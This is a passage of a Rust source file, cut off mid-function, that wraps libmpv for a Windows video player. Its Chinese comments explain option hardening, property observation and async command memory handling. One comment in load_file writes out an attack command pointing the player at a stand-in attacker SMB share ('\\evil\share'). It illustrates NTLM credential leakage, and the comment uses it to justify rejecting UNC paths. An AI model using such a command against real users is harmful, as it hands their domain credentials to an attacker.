//! libmpv 安全封装：创建上下文、下发命令、读属性、在独立线程里收事件。

/// libmpv 的原始 ABI 声明。
///
/// 这个模块是 mpv `client.h` 的对照表：常量值必须与头文件逐一对应，
/// 即使当前逻辑只用得到一部分，也刻意保留全部枚举成员，避免
/// 后续加功能时误判某个 id 的含义。
#[allow(dead_code)]
pub mod ffi;

use std::collections::HashMap;
use std::ffi::{c_char, c_int, c_void, CStr, CString};
use std::mem::MaybeUninit;
use std::os::windows::ffi::OsStrExt;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::thread::JoinHandle;

use ffi::*;

/// 某个被观察属性的 MPV_FORMAT_*，供事件解码时还原类型。
fn observed_format(name: &str) -> Option<c_int> {
    OBSERVED_PROPERTIES
        .iter()
        .find(|(n, _)| *n == name)
        .map(|(_, fmt)| *fmt)
}

/// 需要观察的属性。变更时通过 `mpv_event` 推给界面。
///
/// 这里不依赖 `reply_userdata` 做映射，而是拿事件里的属性名反查，
/// 少一层状态，代价只是一次极短的线性查找。
///
/// **刻意不观察 `time-pos`**：它每个视频帧都会变一次，观察它等于把
/// 几十到几百条事件/秒转成界面刷新。进度条改成界面线程定时读取，
/// 刷新率由定时器决定（见 `app::TICK_MS`，250ms），事件流量降为零。
pub const OBSERVED_PROPERTIES: &[(&str, c_int)] = &[
    ("duration", MPV_FORMAT_DOUBLE),
    ("pause", MPV_FORMAT_FLAG),
    ("volume", MPV_FORMAT_DOUBLE),
    ("mute", MPV_FORMAT_FLAG),
    ("media-title", MPV_FORMAT_STRING),
    ("idle-active", MPV_FORMAT_FLAG),
    // 硬件解码实际生效的是哪一个（`d3d11va` / `dxva2` / `no`）。
    //
    // **加这条的理由是「静默降级看不见」**：D3D11VA 在某个适配器上做格式
    // 探测失败时，mpv 不发 error、不发 warning，只是把 `hwdec` 从白名单里
    // 悄悄拿掉继续用软解。在低端机上这是最难排查的性能问题——画面能播，
    // 但 CPU 跑满、机器发烫，用户只会觉得「这个播放器慢」。
    //
    // 典型触发场景：机器上装了虚拟显示器（远程控制 / 投屏 / 采集软件会装
    // IddCx 虚拟适配器），它也可能出现在 DXGI 枚举里；一旦被 Windows 选成
    // 默认适配器，而它没有硬件解码能力，就是这个结果。
    //
    // 值在解码器真正创建之后才确定，可能晚于 `file-loaded`，所以
    // `App::tick` 还会主动 poll 一次。
    ("hwdec-current", MPV_FORMAT_STRING),
    // ---- 解码健康度（0.4.0 新增）----------------------------------------
    //
    // 下面这些名字**全部是实测出来的**，不是照文档抄的。写错一个名字的后果
    // 是 `mpv_observe_property` 返回错误 → `configure` 失败 → `initialize`
    // 之前就退出 → **程序根本起不来**，而且报错只会说「observing property
    // XXX failed」，看不出是哪个名字错了。
    //
    // 探针实测（mpv 0.41.0-1095，`tests/media/loop60s.mp4`）的结论：
    //
    //   * `vo-drop-frame-count` **不存在**。mpv 文档里的旧名字已经改成
    //     `frame-drop-count`（windowed 实测 = 10，headless 实测 = 0）。
    //     照文档写会直接让程序起不来。
    //   * `mistimed-frame-count`、`estimated-display-fps`、`video-bitrate`
    //     在这份 libmpv 上都不可读（带真实 VO 也一样），所以没接。
    //   * `video-params/hwtype`、`video-out-params/hwtype` 不可读。
    //     零拷贝的信号改用 `video-params/pixelformat`：软解时是 `yuv420p`，
    //     D3D11 硬解时变成 `d3d11`。
    //
    // `tests/观测属性都能注册.rs` 把这条钉住：任何一个名字失效都会让那条
    // 测试失败，而它在 CI / 本机上都不需要 GPU。
    //
    // 只观察**低频**的那些。`estimated-vf-fps`、`display-fps`、`speed`、
    // demuxer 缓存这些每个视频帧都可能变，观察它们等于把每秒几十上百条
    // 事件转成界面刷新——和当初刻意不观察 `time-pos` 是同一个理由。
    // 它们改由 `diag::Diagnostics::refresh` 在面板可见时按 250ms 主动读。
    ("video-format", MPV_FORMAT_STRING),
    // pixelformat 从 yuv420p 变成 d3d11 = 解码帧直接进了 GPU，没有 CPU 往返
    ("video-params/pixelformat", MPV_FORMAT_STRING),
    ("video-params/w", MPV_FORMAT_INT64),
    ("video-params/h", MPV_FORMAT_INT64),
    // 输出分辨率。与上面的源分辨率不同 = 被缩放过（窗口大小 / 色度重采样）
    ("video-out-params/w", MPV_FORMAT_INT64),
    ("video-out-params/h", MPV_FORMAT_INT64),
    // 两个丢帧计数。它们只在真的丢帧时才变，频率天然很低，适合事件驱动。
    ("decoder-frame-drop-count", MPV_FORMAT_INT64),
    ("frame-drop-count", MPV_FORMAT_INT64),
    ("current-vo", MPV_FORMAT_STRING),
    ("video-sync", MPV_FORMAT_STRING),
];

/// 属性的值。
///
/// 原来这里用的是 `serde_json::Value`，因为界面是网页、事件要序列化成
/// JSON 跨进程传输。界面改成原生自绘之后没有任何序列化需求，
/// 直接用枚举省掉一次堆分配和一次 JSON 解析。
#[derive(Debug, Clone, PartialEq)]
pub enum PropertyValue {
    Flag(bool),
    Number(f64),
    /// mpv 里的 int64 属性。丢帧计数、分辨率这些注册成 int64 而不是 double，
    /// 用 double 读会拿到 `MPV_ERROR_PROPERTY_FORMAT`。
    Integer(i64),
    /// mpv 内部持有的字符串，克隆时已经复制了一份
    Text(String),
}

impl PropertyValue {
    pub fn as_flag(&self) -> Option<bool> {
        match self {
            PropertyValue::Flag(v) => Some(*v),
            _ => None,
        }
    }

    pub fn as_number(&self) -> Option<f64> {
        match self {
            PropertyValue::Number(v) => Some(*v),
            _ => None,
        }
    }

    pub fn as_integer(&self) -> Option<i64> {
        match self {
            PropertyValue::Integer(v) => Some(*v),
            _ => None,
        }
    }

    pub fn as_text(&self) -> Option<&str> {
        match self {
            PropertyValue::Text(v) => Some(v),
            _ => None,
        }
    }
}

/// mpv 报告的属性变化，界面据此更新。
#[derive(Debug, Clone)]
pub struct PropertyChange {
    pub name: &'static str,
    pub value: PropertyValue,
}

/// 事件循环产生的所有消息。
#[derive(Debug, Clone)]
pub enum MpvEventMessage {
    Property(PropertyChange),
    /// 播放结束（播完、被 stop 或 quit）
    EndFile,
    /// 文件解码开始，用于清除上一段视频残留的 UI 状态
    FileLoaded,
    /// 播放核心报错，例如文件打不开
    Error(String),
    /// 一条命令被 mpv 拒绝了。
    ///
    /// `mpv_command_async` 对**无效命令名**返回的是成功，被拒绝这件事要等
    /// 之后那条 `MPV_EVENT_COMMAND_REPLY` 才送到（`error` 非零）。而事件
    /// 循环原来只在收到回复时归还参数内存、把 `error` 整个丢掉，于是
    /// 「命令名拼错了」和「命令执行完了」在调用方看来完全一样：按了键，
    /// 什么都没发生，也没有任何日志。
    ///
    /// 0.4.0 加逐帧 / 变速 / 截图时踩的就是这个坑，所以补上这条通道。
    /// 消息里是 mpv 的错误原文，界面上按 `err_command` 显示。
    CommandError(String),
}

/// initialize 之前必须设好的选项。
pub struct InitOptions {
    /// 渲染目标 HWND，mpv 直接画到这个原生窗口
    pub wid: isize,
    /// 不开视频输出（`vo=null`）。
    ///
    /// 给没有 GPU、没有 D3D 的环境（如 CI）用：这样集成测试只验证解码链路，
    /// 不会因为视频输出初始化失败而误判成「文件打不开」。
    pub headless: bool,
}

/// 一个已初始化的 mpv 实例。
pub struct MpvPlayer {
    api: Arc<MpvApi>,
    handle: *mut c_void,
    /// 事件线程的退出标志
    shutdown: Arc<AtomicBool>,
    /// 事件线程句柄。drop 时先 join 再释放 api/library，
    /// 顺序反了会导致线程访问已卸载的 DLL。
    event_thread: Mutex<Option<JoinHandle<()>>>,
    /// 在途命令的参数内存，收到对应 COMMAND_REPLY 后归还。
    ///
    /// `mpv_command_async` 要求参数数组在命令执行完毕前保持有效，而命令是
    /// 异步的，调用返回时 mpv 未必已经读完。这里为每条命令分配一块内存并
    /// 登记在这里，事件线程收到回复后释放，避免「每次按键都泄漏一份参数」
    /// 的无界增长。
    pending: Arc<Mutex<HashMap<u64, PendingCommand>>>,
    /// `reply_userdata` 自增序列，保证每个在途命令的 id 唯一。
    next_reply_id: AtomicU64,
    /// 上下文是否已经 `mpv_destroy` 过。
    ///
    /// `shutdown()` 和 `Drop` 都会走到 `finish`，两次 `mpv_destroy` 同一个
    /// 句柄是 use-after-free。用标志位而不是把 `handle` 改成 `AtomicPtr` 置空：
    /// 几十处调用点都直接读 `self.handle`，改成每次都 load 一遍既啰嗦又
    /// 掩盖了「这里本来该有个有效句柄」这个不变量。
    destroyed: AtomicBool,
}

/// 一条在途异步命令持有的参数内存。
///
/// `_ptrs` 指向 `_args` 自己的堆内存；两者一起 drop，所以只要结构还活着，
/// 指针就一定指向有效内存。
///
/// `name` 是命令名（`args[0]`）。回复里只有 `reply_userdata`，拿不到命令名，
/// 所以在这里存一份，才能在 mpv 拒绝命令时告诉用户**是哪一条命令**被拒了。
struct PendingCommand {
    _args: Box<[CString]>,
    _ptrs: Box<[*const c_char]>,
    name: String,
}

// SAFETY: 裸指针本身不是 Send，这里逐条说明为什么可以跨线程传递。
// 1. `_ptrs` 里的每个指针都指向同一个结构内 `_args` 的堆内存，
//    而 Box 的堆缓存在 move 前后地址不变（move 只搬胖指针），
//    所以登记进 map 之后指针依然有效。
// 2. 结构体一旦 drop，内存即归还，此后没有任何路径能再读到 `_ptrs`。
// 3. `command()` 登记之后不再改动其中任何内容；唯一的读者是 mpv 自己，
//    且它只保证在 COMMAND_REPLY 之前读取，而回收正是由该回复触发的。
// 4. map 由 `Mutex` 保护，读写不会并发。
unsafe impl Send for PendingCommand {}

// mpv 文档明确：除 mpv_wait_event / mpv_set_wakeup_callback 外，
// 其余 API 都是线程安全的（内部有锁），handle 可以跨线程使用。
unsafe impl Send for MpvPlayer {}
unsafe impl Sync for MpvPlayer {}

impl MpvPlayer {
    /// 创建并初始化 mpv 上下文。
    pub fn new(options: &InitOptions) -> Result<Self, String> {
        let api = Arc::new(MpvApi::load(&resolve_library_path()?)?);

        let handle = unsafe { (api.create)() };
        if handle.is_null() {
            return Err("mpv_create returned a null handle".to_string());
        }

        if let Err(e) = Self::configure(&api, handle, options) {
            unsafe { (api.destroy)(handle) };
            return Err(e);
        }

        Ok(Self {
            api,
            handle,
            shutdown: Arc::new(AtomicBool::new(false)),
            event_thread: Mutex::new(None),
            pending: Arc::new(Mutex::new(HashMap::new())),
            next_reply_id: AtomicU64::new(1),
            destroyed: AtomicBool::new(false),
        })
    }

    /// mpv 的 API 版本号，高 16 位是 major，低 16 位是 minor。
    pub fn api_version(&self) -> u32 {
        unsafe { (self.api.client_api_version)() }
    }

    fn configure(api: &MpvApi, handle: *mut c_void, options: &InitOptions) -> Result<(), String> {
        unsafe {
            let set_opt = |name: &str, value: &CString| -> Result<(), String> {
                let cname = CString::new(name)
                    .map_err(|_| format!("option name {name:?} contains a NUL byte"))?;
                let code = (api.set_option_string)(handle, cname.as_ptr(), value.as_ptr());
                check(api, code, &format!("setting option {name}"))
            };

            // 渲染目标窗口：mpv 用 Direct3D 直接画到这个 HWND。
            let wid =
                CString::new(options.wid.to_string()).map_err(|_| "非法窗口句柄".to_string())?;
            set_opt("wid", &wid)?;

            // 不读用户的 mpv.conf：那里可以改 vo / hwdec / 协议等几乎所有
            // 行为，播放器行为不应该随外部配置漂移。
            set_opt("config", &CString::new("no").unwrap())?;
            // 不执行任何脚本。`mpv.conf` 里的 load-scripts 能加载用户目录下的
            // Lua/JS 脚本，而脚本能调起任意进程——等价于让一个放在用户目录里
            // 的文件在启动时执行代码。ytdl 是 mpv 自带的 youtube-dl 钩子脚本，
            // 同样不需要。
            set_opt("load-scripts", &CString::new("no").unwrap())?;
            set_opt("ytdl", &CString::new("no").unwrap())?;

            // 缓存上限。**注意：这三项在本地文件播放路径下其实不生效。**
            //
            // mpv 的 `demux.c::update_opts()` 里 `use_cache = is_streaming`，
            // 而 `is_streaming` 来自 `stream.h` 的 `bool streaming` 注释
            // 「known to be a network stream if true」。本地文件的
            // `stream_file.c` 把它置 false，于是 `seekable_cache = false`、
            // `max_bytes_bw` 被直接归零、demuxer 缓存根本不分配。
            // mpv 文档对 `cache-pause` 也印证了这个方向：「If disabled,
            // `--cache-pause` and related are implicitly disabled」。
            //
            // 所以它们的作用是：(a) 万一将来支持网络流 / `fd://` / 拖进来的
            // 网络路径时有个合理上限（默认值 150MiB/50MiB 确实太大）；
            // (b) 明确行为不随 mpv.conf 漂移。
            //
            // 保留但**不要以为它们在省内存**——实测里播放时涨的那几十 MB
            // 来自 D3D11 设备与 Intel 驱动，不是 demux 缓存。
            set_opt("demuxer-max-bytes", &CString::new("48MiB").unwrap())?;
            set_opt("demuxer-max-back-bytes", &CString::new("16MiB").unwrap())?;
            set_opt("cache-pause", &CString::new("no").unwrap())?;

            // 解码线程数取**物理核**。
            //
            // 原来用 `std::thread::available_parallelism()`，而它在 Windows 上
            // 就是 `GetSystemInfo().dwNumberOfProcessors`——**逻辑**核数。
            // i3-3xxx 全系是 2 物理核 + 4 线程，这里会得到 4，等于在 2 个
            // 物理核上开 4 条解码线程：调度器把两个 runnable 线程塞进一个
            // 执行单元，而软件解码是 ALU-bound、超线程对它几乎无收益，代价
            // 是每核两线程各要一份参考帧列表与帧缓冲池元数据、L1/L2 冲突上升。
            // 净效果是更慢。
            //
            // 硬件解码时这条选项整个不生效（`thread_count` 只喂给软解的
            // libavcodec），所以它只在**回落到软解**的老片源 / AV1 / 10bit
            // HEVC 上有意义 —— 那恰恰是低端机最容易卡住的场景。
            let threads = crate::cpu::decode_threads();
            set_opt(
                "vd-lavc-threads",
                &CString::new(threads.to_string()).unwrap(),
            )?;

            // 直接渲染（decoded frame 不经 CPU 往返）在本配置下无效：
            // `vd-lavc-dr` 的支持条件是「vo=gpu 且 OpenGL 4.4+」或「Vulkan」，
            // 而我们是 `gpu-context=d3d11`，两个都不是。显式写 `no` 是零风险，
            // 价值在于**记录**这条路径不依赖 DR——否则后来人会看到 `auto`
            // 就以为「开着更快」而去调它。
            set_opt("vd-lavc-dr", &CString::new("no").unwrap())?;

            if options.headless {
                // 不开视频输出。必须在 initialize 之前设，vo 选项初始化后再改
                // 未必生效。
                set_opt("vo", &CString::new("null").unwrap())?;
                // 没有输出窗口，硬件解码的 zero-copy 路径也没必要
                set_opt("hwdec", &CString::new("no").unwrap())?;
            } else {
                // 有 wid 时仍需显式要求窗口化输出。
                set_opt("force-window", &CString::new("yes").unwrap())?;
                // 用旧版 vo=gpu（而非 gpu-next）+ d3d11 上下文：
                // flip-model 呈现是 gpu-next 的特性，旧版 gpu VO 用 blit 模型，
                // 不要求窗口消息循环泵送，画面不会因为主线程没及时
                // WM_PAINT 而黑屏。
                // d3d11-flip-model 选项只能在 VO 初始化后用 set_property 设置，
                // 无法在 mpv_initialize 之前用 set_option 设置（返回 -5）。
                set_opt("vo", &CString::new("gpu").unwrap())?;
                set_opt("gpu-context", &CString::new("d3d11").unwrap())?;
                // 硬件解码自动选择，不兼容时回落到软件解码。
                //
                // 用 `auto` 而不是 `auto-safe`：mpv 文档对这两个值的定义是
                // 「`:auto-safe: exactly the same as :auto:`」，`auto-safe` 是
                // 早期用来区分 `auto` / `auto-unsafe` 的命名残留，在当前文档
                // 里没有独立语义。行为完全一样，但 `auto` 是规范写法，查文档
                // 查得到。
                set_opt("hwdec", &CString::new("auto").unwrap())?;
                // 不指定 `d3d11-adapter`：那是前缀匹配，绑死「Intel」会让
                // AMD / NVIDIA 机器白担风险（匹配不上时 mpv 只发一条
                // `mp_warn` 就回落默认适配器，等于没配）。
                //
                // 真正该防的是「虚拟显示器被 Windows 选成默认适配器 →
                // D3D11VA 格式探测全失败 → **静默**退回软解」。mpv 不为这
                // 种情况发任何 error，所以唯一的可靠手段是观测 `hwdec-current`
                // （见 `OBSERVED_PROPERTIES`）：它在 D3D11VA 探测失败时如实
                // 报 `no`。
                // 关掉 mpv 自带的 OSD/控制条，控制栏由前端负责。
                set_opt("osc", &CString::new("no").unwrap())?;
                set_opt("osd-level", &CString::new("0").unwrap())?;
            }

            check(api, (api.initialize)(handle), "mpv_initialize")?;

            for (name, format) in OBSERVED_PROPERTIES {
                let cname = CString::new(*name).map_err(|_| "属性名包含空字节".to_string())?;
                let code = (api.observe_property)(handle, 0, cname.as_ptr(), *format);
                check(api, code, &format!("observing property {name}"))?;
            }
        }
        Ok(())
    }

    /// 启动事件线程。
    ///
    /// `on_event` 在事件线程上被调用，必须短小且非阻塞。
    pub fn spawn_event_loop(&self, on_event: Box<dyn Fn(MpvEventMessage) + Send + 'static>) {
        let api = Arc::clone(&self.api);
        let shutdown = Arc::clone(&self.shutdown);
        let pending = Arc::clone(&self.pending);
        // 裸指针不是 Send，传地址而不是指针本身
        let handle_addr = self.handle as usize;

        let thread = std::thread::Builder::new()
            .name("mpv-events".to_string())
            .spawn(move || {
                let handle = handle_addr as *mut c_void;
                while !shutdown.load(Ordering::Relaxed) {
                    // 有限超时而非无限阻塞，这样能及时看到 shutdown 标志，
                    // 保证不会在线程存活时卸载 DLL。
                    let raw = unsafe { (api.wait_event)(handle, 0.2) };
                    if raw.is_null() {
                        continue;
                    }

                    let event = unsafe { &*raw };
                    match event.event_id {
                        MPV_EVENT_SHUTDOWN => break,
                        MPV_EVENT_PROPERTY_CHANGE => {
                            if let Some(msg) = decode_property(event.data, observed_format) {
                                on_event(msg);
                            }
                        }
                        MPV_EVENT_END_FILE => {
                            if let Some(msg) = decode_end_file(&api, event.data, event.error) {
                                on_event(msg);
                            }
                        }
                        MPV_EVENT_FILE_LOADED => on_event(MpvEventMessage::FileLoaded),
                        // 异步命令执行完毕，归还它在途期间占用的参数内存。
                        MPV_EVENT_COMMAND_REPLY => {
                            let mut taken = None;
                            if let Ok(mut map) = pending.lock() {
                                taken = map.remove(&event.reply_userdata);
                            }
                            // `error` 非零 = mpv 拒绝了这个命令。命令名写错时
                            // 这是**唯一**的信号：`command_async` 本身返回成功。
                            //
                            // `quit` 不上报：它是在 `shutdown()` 里发的，事件线程
                            // 可能先收到 SHUTDOWN 而退出，回复压根不来；而如果来了，
                            // 那也是正常的退出时序，报错只会让用户莫名其妙。
                            if event.error != 0 {
                                if let Some(cmd) = taken {
                                    if cmd.name != "quit" {
                                        on_event(MpvEventMessage::CommandError(format!(
                                            "{}: {}",
                                            cmd.name,
                                            api.error_message(event.error)
                                        )));
                                    }
                                }
                            }
                        }
                        _ => {}
                    }
                }
            })
            .expect("创建 mpv 事件线程失败");

        *self.event_thread.lock().unwrap_or_else(|e| e.into_inner()) = Some(thread);
    }

    /// 读一个字符串属性。
    pub fn get_property_string(&self, name: &str) -> Result<String, String> {
        let cname = CString::new(name).map_err(|_| "属性名包含空字节".to_string())?;
        let mut out: *mut c_char = std::ptr::null_mut();
        let code = unsafe {
            (self.api.get_property)(
                self.handle,
                cname.as_ptr(),
                MPV_FORMAT_STRING,
                &mut out as *mut _ as *mut c_void,
            )
        };
        if code < 0 {
            return Err(self.api.error_message(code));
        }
        if out.is_null() {
            return Ok(String::new());
        }
        let text = unsafe { CStr::from_ptr(out).to_string_lossy().into_owned() };
        // mpv 分配的内存必须由 mpv_free 释放
        unsafe { (self.api.free)(out as *mut c_void) };
        Ok(text)
    }

    /// 读一个浮点属性。
    pub fn get_double_property(&self, name: &str) -> Result<f64, String> {
        let cname = CString::new(name).map_err(|_| "属性名包含空字节".to_string())?;
        let mut out = 0.0_f64;
        let code = unsafe {
            (self.api.get_property)(
                self.handle,
                cname.as_ptr(),
                MPV_FORMAT_DOUBLE,
                &mut out as *mut _ as *mut c_void,
            )
        };
        if code < 0 {
            Err(self.api.error_message(code))
        } else {
            Ok(out)
        }
    }

    /// 读一个 64 位整数属性。
    ///
    /// 丢帧计数那几个观测项（`vo-drop-frame-count` 等）在 mpv 里注册的是
    /// **int64** 而不是 double，所以必须按 int64 读：用 double 读会拿到
    /// `MPV_ERROR_PROPERTY_FORMAT`。
    pub fn get_int64_property(&self, name: &str) -> Result<i64, String> {
        let cname = CString::new(name).map_err(|_| "属性名包含空字节".to_string())?;
        let mut out: i64 = 0;
        let code = unsafe {
            (self.api.get_property)(
                self.handle,
                cname.as_ptr(),
                MPV_FORMAT_INT64,
                &mut out as *mut _ as *mut c_void,
            )
        };
        if code < 0 {
            Err(self.api.error_message(code))
        } else {
            Ok(out)
        }
    }

    /// 读一个布尔（flag）属性。
    pub fn get_flag_property(&self, name: &str) -> Result<bool, String> {
        let cname = CString::new(name).map_err(|_| "属性名包含空字节".to_string())?;
        let mut out: c_int = 0;
        let code = unsafe {
            (self.api.get_property)(
                self.handle,
                cname.as_ptr(),
                MPV_FORMAT_FLAG,
                &mut out as *mut _ as *mut c_void,
            )
        };
        if code < 0 {
            Err(self.api.error_message(code))
        } else {
            Ok(out != 0)
        }
    }

    pub fn get_volume(&self) -> Result<f64, String> {
        self.get_double_property("volume")
    }

    pub fn get_mute(&self) -> Result<bool, String> {
        self.get_flag_property("mute")
    }

    pub fn get_pause(&self) -> Result<bool, String> {
        self.get_flag_property("pause")
    }

    /// 下发命令，参数按 mpv `input.conf` 的风格拆分。
    ///
    /// 用 `mpv_command_async` 而不是同步的 `mpv_command`：后者会阻塞到命令
    /// 执行完毕，而 `loadfile` 在初始化视频输出时可能长时间不返回。
    /// 在 GUI 的命令线程里同步等待，会把整个界面卡死。
    ///
    /// **参数生命周期**：命令是异步的，返回时 mpv 未必已经读完 `args`，
    /// 参数内存必须活到命令真正执行完。这里把参数登记进 `pending`，由事件
    /// 线程在收到对应的 `COMMAND_REPLY` 时释放——既保证指针有效，又不会像
    /// 直接 `Box::leak` 那样每按一次键就永久泄漏一份（空格键切暂停、
    /// 停止、打开文件都会走到这里）。
    fn command(&self, args: &[&str]) -> Result<(), String> {
        let mut owned: Vec<CString> = Vec::with_capacity(args.len());
        for a in args {
            owned.push(
                CString::new(*a)
                    .map_err(|_| format!("command argument {a:?} contains a NUL byte"))?,
            );
        }
        // 命令名先拿出来存一份：`args` 随后会被 move 进 Box，而事件线程
        // 需要在归还时知道是哪一条命令被拒了。
        let name = owned
            .first()
            .and_then(|c| c.to_str().ok())
            .unwrap_or_default()
            .to_string();
        let args: Box<[CString]> = owned.into_boxed_slice();

        let mut ptrs: Vec<*const c_char> = args.iter().map(|c| c.as_ptr()).collect();
        ptrs.push(std::ptr::null()); // mpv 要求以 NULL 结尾
        let ptrs: Box<[*const c_char]> = ptrs.into_boxed_slice();

        // Box 的堆缓存在 move 前后地址不变，所以这里取到的指针在 move 之后
        // 依然指向 args 的内容。
        let args_ptr = ptrs.as_ptr() as *mut *const c_char;

        // reply_userdata 用来把回复对回这条命令，事件线程据此归还内存。
        let reply_id = self.next_reply_id.fetch_add(1, Ordering::Relaxed);
        self.pending
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .insert(
                reply_id,
                PendingCommand {
                    _args: args,
                    _ptrs: ptrs,
                    name,
                },
            );

        let code = unsafe { (self.api.command_async)(self.handle, reply_id, args_ptr) };
        if code < 0 {
            // 命令没被接受，mpv 不会发回复，这里立刻收回内存
            self.pending
                .lock()
                .unwrap_or_else(|e| e.into_inner())
                .remove(&reply_id);
            return Err(format!(
                "could not send the command: {}",
                self.api.error_message(code)
            ));
        }
        Ok(())
    }

    /// 取一个 `MPV_FORMAT_NODE` 属性，遍历成 Rust 侧的值树。
    ///
    /// `track-list` 这类属性不是标量，而是 mpv 自己的节点树（对象 / 数组 /
    /// 标量三种节点递归组成）。mpv 分配它、**由调用方释放**，所以这里
    /// 用 `NodeGuard` 保证 `mpv_free_node_contents` 一定被调到 —— 漏掉
    /// 就是泄漏，而「打开文件 → 切轨 → 关文件」这个循环会漏得很快。
    ///
    /// 遍历过程中把每个节点的字符串都**复制**成 Rust 的 `String` 之后
    /// 才释放原树，所以返回值不借用任何 mpv 内存。
    pub fn get_node_tree(&self, name: &str) -> Result<MpvValue, String> {
        let cname = CString::new(name).map_err(|_| "属性名包含空字节".to_string())?;
        let mut node = MaybeUninit::<ffi::MpvNode>::uninit();
        let code = unsafe {
            (self.api.get_property)(
                self.handle,
                cname.as_ptr(),
                MPV_FORMAT_NODE,
                node.as_mut_ptr() as *mut c_void,
            )
        };
        if code < 0 {
            return Err(self.api.error_message(code));
        }
        // 从这里起 node 已初始化，且**必须**被释放
        // SAFETY: mpv_get_property 返回 0 时按契约一定填好了这个结构
        let node_init = unsafe { node.assume_init() };
        let node = NodeGuard {
            node: node_init,
            free: self.api.free_node_contents,
        };
        Ok(convert_node(&node.node))
    }

    fn set_double_property(&self, name: &str, value: f64) -> Result<(), String> {
        let cname = CString::new(name).map_err(|_| "属性名包含空字节".to_string())?;
        let mut v = value;
        let code = unsafe {
            (self.api.set_property)(
                self.handle,
                cname.as_ptr(),
                MPV_FORMAT_DOUBLE,
                &mut v as *mut _ as *mut c_void,
            )
        };
        check(&self.api, code, &format!("setting property {name}"))
    }

    fn set_flag_property(&self, name: &str, value: bool) -> Result<(), String> {
        let cname = CString::new(name).map_err(|_| "属性名包含空字节".to_string())?;
        let mut v: c_int = i32::from(value);
        let code = unsafe {
            (self.api.set_property)(
                self.handle,
                cname.as_ptr(),
                MPV_FORMAT_FLAG,
                &mut v as *mut _ as *mut c_void,
            )
        };
        check(&self.api, code, &format!("setting property {name}"))
    }

    /// 加载并播放文件。
    ///
    /// 这是路径进入 mpv 的唯一入口，校验放在这里而不是调用方：外部输入
    /// （文件对话框 / 拖放 / 命令行）将来都可能换成不可信来源，校验点只有
    /// 一个才不会漏。
    ///
    /// 校验不能省，因为 mpv 的 `loadfile` 第一个参数是 **URL 而不只是文件名**。
    /// mpv 0.41 支持 `http` / `smb` / `lavf` / `avconcat` / `archive` / `env` /
    /// `memory` / `fd` 等一批协议，而 mpv 0.40 起已经没有 `protocol-white`
    /// 选项可用，所以只能在入口挡。要求「确实是磁盘上已存在的普通文件」，
    /// 能通过这一关的必然是本地文件，`D:\a.mp4` 与 `http://…` 由此分清。
    ///
    /// 传 `&Path` 而不是 `&str`：路径的原始形态是 UTF-16，mpv 的命令接口只收
    /// UTF-8，转码不可逆时（未配对的代理项，emoji 文件名能造出来）必须明确
    /// 报错。`to_string_lossy` 会悄悄把非法字符换成 U+FFFD，拼出来的路径指向
    /// 一个不存在的文件，用户看到的却是「找不到文件」，报错完全指错方向。
    pub fn load_file(&self, path: &Path) -> Result<(), String> {
        if path.as_os_str().is_empty() {
            return Err("the file path is empty".to_string());
        }
        // **先挡 UNC，再做任何会碰文件系统的事。**
        //
        // 这一条必须在 `is_file()` 之前：`Path::is_file()` 走 `metadata()`，
        // 对 `\\attacker\share\x.mp4` 会真的去建 SMB 连接。mpv 随后也会用
        // **当前用户的凭据**发起 SMB/NTLM 协商。也就是说，
        //
        //     video-view.exe "\\evil\share\a.mp4"
        //
        // 这一条命令行就能让受害者的进程去连攻击者的共享，把 NetBIOS 挑战/
        // 应答（也就是域凭据）交出去。任何低权限代码只要能起一个进程就能触发：
        // 快捷方式、注册表 `shell\open\command`、MSI 自定义动作，都不需要
        // 用户点一下「是」。
        //
        // mpv 的协议白名单（`protocol-white`）从 0.40 起就没了，`\\` 又是
        // 合法路径字符、不能靠「不是 URL」蒙混过去，所以只能在入口按形状拒。
        reject_remote_path(path)?;
        // 先验存在性再转码：这样「找不到文件」和「路径无法表示」是两种错误，
        // 不会混成一条
        if !path.is_file() {
            return Err(format!("file not found: {}", path.display()));
        }
        let url = path.to_str().ok_or_else(|| {
            format!(
                "the path cannot be represented as UTF-8: {}",
                path.display()
            )
        })?;
        if url.contains('\0') {
            return Err("the file path contains a NUL byte".to_string());
        }
        // loadfile <url> <flags>；replace 表示替换当前播放列表
        self.command(&["loadfile", url, "replace"])
    }

    pub fn toggle_pause(&self) -> Result<(), String> {
        // 用 `set pause yes/no` 而不是 `cycle-pause`：
        // mpv 0.41 里 `cycle-pause` 已经不是有效命令，`mpv_command_async`
        // 会返回 MPV_ERROR_INVALID_PARAMETER(-4)，命令被静默丢弃，
        // 表现为「播放/暂停按钮、空格、点击画面全都没反应」。
        // 切换前先读 mpv 自己的 pause 属性，避免前端状态漂移导致切反。
        let paused = self.get_pause()?;
        self.command(&["set", "pause", if paused { "no" } else { "yes" }])
    }

    /// 显式设置暂停状态。
    pub fn set_pause(&self, paused: bool) -> Result<(), String> {
        self.set_flag_property("pause", paused)
    }

    pub fn stop(&self) -> Result<(), String> {
        self.command(&["stop"])
    }

    /// 跳转到指定秒数。
    pub fn seek(&self, seconds: f64) -> Result<(), String> {
        self.set_double_property("time-pos", seconds)
    }

    /// 逐帧步进。
    ///
    /// 走 mpv 的 `frame-step` / `frame-back-step` 命令而不是自己算一帧的时长
    /// 再 `seek`：可变帧率（VFR）素材里「一帧」不是固定的 1/fps，自己算会
    /// 越走越偏。
    pub fn frame_step(&self, forward: bool) -> Result<(), String> {
        self.command(if forward {
            &["frame-step"]
        } else {
            &["frame-back-step"]
        })
    }

    /// 设置倍速。
    ///
    /// 走 `speed` 属性而不是 `speed <factor>` 命令：属性值可以随时读回来
    /// 显示，而命令执行完就没了。
    pub fn set_speed(&self, speed: f64) -> Result<(), String> {
        self.set_double_property("speed", speed.clamp(0.0625, 16.0))
    }

    /// 把当前画面存成图片文件。
    ///
    /// 用 `screenshot-to-file` 而不是 `screenshot`：后者按 mpv 自己的命名规则
    /// 写到工作目录，而从资源管理器启动时工作目录不确定，用户根本找不到。
    ///
    /// 第三个参数是 mpv 的截图 flag，显式给 `video`（只要画面、不要字幕）。
    /// 不传的话默认值是 `subtitles`，行为会随 mpv 版本漂移。
    pub fn screenshot_to_file(&self, path: &Path) -> Result<(), String> {
        let Some(p) = path.to_str() else {
            return Err("screenshot path is not valid Unicode".to_string());
        };
        self.command(&["screenshot-to-file", p, "video"])
    }

    /// 设置音量。mpv 允许 0~130，这里前端限制在 100。
    pub fn set_volume(&self, volume: f64) -> Result<(), String> {
